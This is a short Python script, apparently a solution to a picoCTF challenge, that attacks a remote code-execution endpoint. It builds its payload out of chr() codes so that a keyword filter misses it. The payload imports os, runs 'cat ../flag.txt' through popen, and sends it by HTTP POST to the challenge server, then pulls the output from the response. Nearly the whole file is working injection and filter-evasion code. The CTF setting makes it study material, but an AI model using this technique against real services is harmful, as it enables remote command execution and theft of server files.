import requests
import re

url = "http://shape-facility.picoctf.net:57889"

def obf(s):
    return '+'.join([f'chr({ord(c)})' for c in s])

payload = f"__import__({obf('os')}).popen({obf('cat ../flag.txt')}).read()"
print(payload)

res = requests.post(f'{url}/execute', data={'code': payload})

try:
    result = re.findall(r'Result: (.+)</p>', res.text.replace("\n", " "))[0]
    print(result)
except:
    print("filtered")